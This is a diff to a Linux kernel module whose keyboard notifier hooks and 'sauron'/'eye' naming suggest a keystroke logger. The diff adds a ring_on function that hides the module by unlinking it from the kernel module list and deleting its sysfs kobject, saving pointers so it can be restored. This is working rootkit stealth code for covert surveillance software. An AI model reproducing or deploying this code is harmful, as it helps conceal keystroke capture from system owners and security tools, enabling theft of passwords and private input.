@@ -4,9 +4,17 @@
 #include <linux/keyboard.h>
 #include <linux/notifier.h>
 
+/* Kernel Module License */
 MODULE_AUTHOR("geno");
 MODULE_LICENSE("GPL");
 
+/* Global Variables */
+static struct list_head *_module_list = NULL;
+static struct kobject *_kobj          = NULL;
+static struct kobject *_kobj_parent   = NULL;
+static struct attribute_group *_kgrp  = NULL;
+
+/* Funcion Prototypes */
 static int start_eye(void);
 static void end_eye(void);
 static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);
@@ -56,4 +64,16 @@ static int sauron_notify(struct notifier_block *nb, unsigned long code, void *ra
     }
 
     return NOTIFY_OK;
+}
+
+void ring_on(void)
+{
+    _module_list = __this_module.list.prev;         /* Remember location in module list */
+    list_del_init(&__this_module.list);             /* Remove from procfs */
+    _kobj = &__this_module.mkobj.kobj;              /* Remember kobject */
+    _kgrp = &(__this_module.sect_attrs->grp);       /* Remember sysfs group */
+    _kobj_parent = __this_module.mkobj.kobj.parent; /* Remember kobject parent */
+    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
+
+    printk("The ring of power is applied.\n");
 }
